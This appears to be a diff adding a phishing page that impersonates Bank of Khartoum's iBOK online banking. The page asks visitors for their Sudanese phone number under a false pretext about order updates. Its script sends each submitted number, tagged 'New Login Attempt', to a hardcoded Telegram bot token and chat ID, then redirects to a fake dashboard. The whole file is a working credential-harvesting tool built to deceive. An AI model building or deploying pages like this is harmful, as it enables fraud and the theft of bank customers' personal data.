@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone number | iBOK</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #121a2a;
+            background-color: #f4f7fb;
+        }
+        
+        .page {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            border: 1px solid #ddd;
+            border-radius: 9px;
+            background-image: radial-gradient(#d1d8e1 1px, transparent 1px);
+            background-size: 18px 18px;
+        }
+        
+        header {
+            height: 142px;
+            flex: 0 0 142px;
+            background: #f32d32;
+            color: #fff;
+        }
+        
+        .header-inner {
+            width: min(708px, calc(100% - 40px));
+            margin: 0 auto;
+            padding-top: 12px;
+        }
+        
+        .welcome {
+            height: 38px;
+            display: grid;
+            place-items: center;
+            border-radius: 24px;
+            background: #ffcc00;
+            color: #17120a;
+            font-size: 14px;
+            font-weight: 700;
+            box-shadow: 0 2px 3px #bb1e2450;
+        }
+        
+        .brand {
+            margin-top: 11px;
+            font-size: 30px;
+            line-height: 1;
+            font-weight: 800;
+            letter-spacing: -1px;
+        }
+        
+        .brand-subtitle {
+            margin-top: 7px;
+            font-size: 13px;
+        }
+        
+        main {
+            flex: 1;
+            padding: 17px 20px 60px;
+        }
+        
+        .card {
+            width: min(672px, 100%);
+            margin: 0 auto;
+            padding: 25px 40px 24px;
+            border-radius: 16px;
+            background: #fff;
+            box-shadow: 0 13px 26px #e8cfd166;
+        }
+        
+        h1 {
+            margin: 0 0 14px;
+            color: #f32d32;
+            text-align: center;
+            font-size: 24px;
+            line-height: 1.2;
+        }
+        
+        .description {
+            max-width: 580px;
+            margin: 0 auto 18px;
+            text-align: center;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+            font-weight: 700;
+        }
+        
+        .phone-field {
+            height: 44px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+            border: 1px solid #ffbfc1;
+            border-radius: 11px;
+            background: #fff7f7;
+        }
+        
+        .prefix {
+            padding: 0 11px;
+            border-right: 1px solid #ffbfc1;
+            font-size: 14px;
+            font-weight: 700;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .country-flag {
+            width: 20px;
+            height: auto;
+        }
+        
+        input {
+            width: 100%;
+            min-width: 0;
+            height: 100%;
+            padding: 0 16px;
+            border: 0;
+            outline: 0;
+            background: transparent;
+            color: #171717;
+            font: inherit;
+            letter-spacing: 1px;
+        }
+        
+        input::placeholder {
+            color: #b9b9c0;
+            letter-spacing: 1px;
+        }
+        
+        .submit-button {
+            width: 100%;
+            height: 42px;
+            margin-top: 15px;
+            border: 0;
+            border-radius: 11px;
+            background: #f32d32;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        
+        .submit-button:hover {
+            background: #db2429;
+        }
+        
+        footer {
+            position: relative;
+            min-height: 59px;
+            display: grid;
+            place-content: center;
+            border-top: 4px solid #f32d32;
+            background: #fff;
+            color: #68758a;
+            text-align: center;
+            font-size: 11px;
+            line-height: 1.7;
+        }
+        
+        .contact-button {
+            position: absolute;
+            left: 27px;
+            bottom: 17px;
+            width: 56px;
+            height: 56px;
+            display: grid;
+            place-items: center;
+            border-radius: 50%;
+            background: #e92329;
+            color: white;
+            box-shadow: 0 4px 10px #0002;
+        }
+        
+        .contact-button svg {
+            width: 25px;
+            height: 25px;
+        }
+        /* Toast notification style */
+        
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px;
+            position: fixed;
+            z-index: 1000;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+            font-size: 14px;
+        }
+        
+        .toast.show {
+            visibility: visible;
+            animation: fadein 0.5s, fadeout 0.5s 2s;
+        }
+        
+        @keyframes fadein {
+            from {
+                bottom: 0;
+                opacity: 0;
+            }
+            to {
+                bottom: 30px;
+                opacity: 1;
+            }
+        }
+        
+        @keyframes fadeout {
+            from {
+                bottom: 30px;
+                opacity: 1;
+            }
+            to {
+                bottom: 0;
+                opacity: 0;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            header {
+                height: 130px;
+                flex-basis: 130px;
+            }
+            .header-inner {
+                width: calc(100% - 32px);
+            }
+            .welcome {
+                font-size: 13px;
+            }
+            main {
+                padding: 16px 14px 48px;
+            }
+            .card {
+                padding: 24px 20px;
+                border-radius: 14px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .description {
+                font-size: 15px;
+            }
+            .contact-button {
+                left: 14px;
+                bottom: 72px;
+                width: 48px;
+                height: 48px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="page">
+        <header>
+            <div class="header-inner">
+                <div class="welcome">Welcome to iBOK Online Banking service</div>
+                <div class="brand">iBOK</div>
+                <div class="brand-subtitle">Online Form</div>
+            </div>
+        </header>
+
+        <main>
+            <section class="card" aria-labelledby="form-title">
+                <h1 id="form-title">Contact Phone Number</h1>
+                <p class="description">
+                    Please enter your phone number so we can contact <br>you if there are any updates regarding your order.
+                </p>
+
+                <form id="demo-form">
+                    <label for="phone">Enter the phone number:</label>
+                    <div class="phone-field">
+                        <span class="prefix">
+                            <img src="https://flagcdn.com/w40/sd.png" alt="Sudan flag" class="country-flag">
+                            +249
+                        </span>
+                        <input id="phone" name="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX" autocomplete="off" aria-label="Phone number">
+                    </div>
+                    <button class="submit-button" type="submit">Continue</button>
+                </form>
+            </section>
+        </main>
+
+        <footer>
+            <div>iBOK | Bank of Khartoum 2026</div>
+            <div>All rights reserved, Bank of Khartoum, iBOK 2026</div>
+        </footer>
+
+        <div class="contact-button" aria-label="Contact demo">
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M20 11.7a8.2 8.2 0 0 1-12.1 7.2L4 20l1.1-3.7A8.2 8.2 0 1 1 20 11.7Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                <path d="M9 8.5c.2-.4.4-.4.7-.4h.4c.2 0 .3.1.4.4l.6 1.4c.1.2.1.4-.1.6l-.5.6c-.2.2-.1.4 0 .6.4.7 1 1.3 1.7 1.7.2.1.4.2.6 0l.6-.5c.2-.2.4-.2.6-.1l1.4.6c.3.1.4.2.4.4v.4c0 .3 0 .5-.4.7-.4.2-1.1.4-1.8.2-1-.3-2.1-.9-3.1-1.9s-1.6-2.1-1.9-3.1c-.2-.7 0-1.4.2-1.8Z" fill="currentColor"/>
+            </svg>
+        </div>
+    </div>
+
+    <!-- Toast element for feedback messages -->
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // =======================
+        // BOT CONFIG
+        // =======================
+        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const CHAT_ID = '8406078749';
+
+        // =======================
+        // DOM REFERENCES
+        // =======================
+        const demoForm = document.getElementById("demo-form");
+        const phoneInput = document.getElementById("phone");
+        const toast = document.getElementById("toast");
+
+        // =======================
+        // INPUT SANITIZER (Numbers Only)
+        // =======================
+        phoneInput.addEventListener("input", function() {
+            // Strips out any non-digit character instantly
+            this.value = this.value.replace(/\D/g, "");
+        });
+
+        // =======================
+        // TOAST NOTIFICATION
+        // =======================
+        function showToast(message) {
+            if (!toast) return;
+            toast.textContent = message;
+            toast.classList.add("show");
+            clearTimeout(window.toastTimer);
+            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
+        }
+
+        // =======================
+        // FORM SUBMISSION & TELEGRAM
+        // =======================
+        demoForm.addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const phone = (phoneInput.value || '').trim();
+
+            if (!phone) {
+                showToast("Please enter the phone number.");
+                phoneInput.focus();
+                return;
+            }
+
+            localStorage.setItem('phone', phone);
+
+            const message = `New Login Attempt\n\nPhone: +249 ${phone}`;
+
+            // Send to Telegram Bot
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(() => {});
+
+            showToast("Form submitted.");
+
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 1500);
+        });
+    </script>
+</body>
+
+</html>
